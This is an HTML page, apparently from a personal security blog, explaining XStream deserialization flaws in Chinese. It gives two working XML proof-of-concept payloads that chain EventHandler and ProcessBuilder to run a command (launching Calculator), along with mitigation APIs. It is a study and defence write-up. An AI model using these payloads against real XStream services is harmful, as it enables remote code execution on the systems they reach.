@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>xstream 反序列化 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "xstream \u53cd\u5e8f\u5217\u5316", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7b80\u4ecb", url: "#_2" },
+              {title: "\u539f\u7406", url: "#_3" },
+              {title: "\u4fee\u590d", url: "#_4" },
+              {title: "cve\u901f\u67e5", url: "#cve" },
+              {title: "\u5173\u952e\u5b57", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浅析FastJSON反序列化漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../springboot/springboot/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../springboot/springboot/" class="btn btn-xs btn-link">
+        springboot
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="xstream">xstream 反序列化</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#简介">简介</a></li>
+<li><a href="#原理">原理</a><ul>
+<li><a href="#poc">poc</a></li>
+</ul>
+</li>
+<li><a href="#修复">修复</a></li>
+<li><a href="#cve速查">cve速查</a></li>
+<li><a href="#关键字">关键字</a></li>
+</ul>
+<h2 id="_2">简介</h2>
+<p>能把java对象从xml反序列化出来，也可以反向操作。</p>
+<h2 id="_3">原理</h2>
+<p>先一言以蔽之：XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象。在反序列化过程中，当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；只需interface标签指向目标程序必然会调用的接口类方法，那么handler指定的类方法（一般为eventhandler类,因为它可以通过内部的反射造成任意方法执行）一定就会被执行从而造成攻击</p>
+<h3 id="poc">poc</h3>
+<p>适用版本 xstream=1.4.10 或小于1.4.6</p>
+<p>eventhandler.invoke→eventhandler.invokeInternal→MethodUtil.invoke</p>
+<p>在这个调用链中出传入要执行的方法和参数即可，在下面的poc中展示</p>
+<pre><code class="language-text">&lt;tree-map&gt;
+    &lt;entry&gt;
+        &lt;dynamic-proxy&gt;
+            &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+            &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+                &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                    &lt;command&gt;
+                        &lt;string&gt;open&lt;/string&gt;
+                        &lt;string&gt;-na&lt;/string&gt;
+                        &lt;string&gt;Calculator&lt;/string&gt;
+                    &lt;/command&gt;
+                &lt;/target&gt;
+                &lt;action&gt;start&lt;/action&gt;
+            &lt;/handler&gt;
+        &lt;/dynamic-proxy&gt;
+        &lt;string&gt;good&lt;/string&gt;
+    &lt;/entry&gt;
+&lt;/tree-map&gt;
+</code></pre>
+<p>java.lang.Comparable作为一个项目中基本必用到的interfae，自然就放到interface标签里了。</p>
+<p>另一个poc 版本：1.4.5，1.4.6，1.4.10</p>
+<pre><code class="language-text">&lt;sorted-set&gt;
+    &lt;dynamic-proxy&gt;
+        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+        &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+            &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                &lt;command&gt;
+                    &lt;string&gt;open&lt;/string&gt;
+                    &lt;string&gt;-na&lt;/string&gt;
+                    &lt;string&gt;Calculator&lt;/string&gt;
+                &lt;/command&gt;
+            &lt;/target&gt;
+            &lt;action&gt;start&lt;/action&gt;
+        &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre>
+<h2 id="_4">修复</h2>
+<p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，建立黑白名单机制进行过滤：</p>
+<pre><code class="language-text">XStream.addPermission(TypePermission);
+XStream.allowTypes(Class[]);
+XStream.allowTypes(String[]);
+XStream.allowTypesByRegExp(String[]);
+XStream.allowTypesByRegExp(Pattern[]);
+XStream.allowTypesByWildcard(String[]);
+XStream.allowTypeHierary(Class);
+XStream.denyPermission(TypePermission);
+XStream.denyTypes(Class[]);
+XStream.denyTypes(String[]);
+XStream.denyTypesByRegExp(String[]);
+XStream.denyTypesByRegExp(Pattern[]);
+XStream.denyTypesByWildcard(String[]);
+XStream.denyTypeHierary(Class);
+</code></pre>
+<p>在1.4.10版本之后，XStream提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认<strong>白名单</strong>，部分白名单是Xstream默认的，用户可以直接调用。</p>
+<h2 id="cve">cve速查</h2>
+<p>官网良心，并给每个cve提供了poc</p>
+<p><a href="https://x-stream.github.io/security.html" title="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></p>
+<p>1.4.18是目前最安全的版本，遇到不用看了——2023.3</p>
+<h2 id="_5">关键字</h2>
+<p>fromXml</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浅析FastJSON反序列化漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../springboot/springboot/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../springboot/springboot/" class="btn btn-xs btn-link">
+        springboot
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
